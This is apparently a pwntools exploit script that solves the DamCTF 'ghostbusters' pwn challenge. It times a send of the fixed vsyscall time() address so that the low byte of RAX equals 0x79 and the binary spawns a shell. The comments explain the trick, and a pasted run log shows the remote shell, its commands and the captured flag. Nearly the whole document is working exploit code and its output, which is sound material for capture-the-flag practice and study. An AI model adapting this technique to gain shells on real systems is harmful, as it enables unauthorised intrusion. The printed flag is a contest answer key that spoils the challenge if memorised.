#!/usr/bin/env python3

from pwn import *
from time import time

HOST = "chals.damctf.xyz"
PORT = 32556

binary = ELF("./ghostbusters")

local = False

if local:
    p = process(binary.path)
else:
    p = remote(HOST, PORT)

vsyscall_time = "ffffffffff600400"

current_time = int(time())
sleep_time = 256 - (current_time - 121) % 256

print("Sleeping for", sleep_time, "seconds!")

sleep(sleep_time)
p.sendline(vsyscall_time)


p.interactive()

# By jumping to the (fixed) address of vsyscall_time(), we set the register RAX to the value of time()
# The program compares the AL register, that is, the 8 lowest bits of RAX, to "0x79", and if it matches
# We acquire shell. Thus we need time() to end in 0x79, or 121. 

# [*] '/home/oskar/CTF/DAM/pwn/ghostbusters/ghostbusters'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to chals.damctf.xyz on port 32556: Done
# Sleeping for 155 seconds!
# [*] Switching to interactive mode
# Who you gonna call?
# $ id
# uid=1000(chal) gid=1000(chal) groups=1000(chal)
# $ ls
# flag
# ghostbusters
# $ cat flag
# dam{th3_Gh0s75_0F_T1m3_k3ep_H4unTiNg_m3}
# $  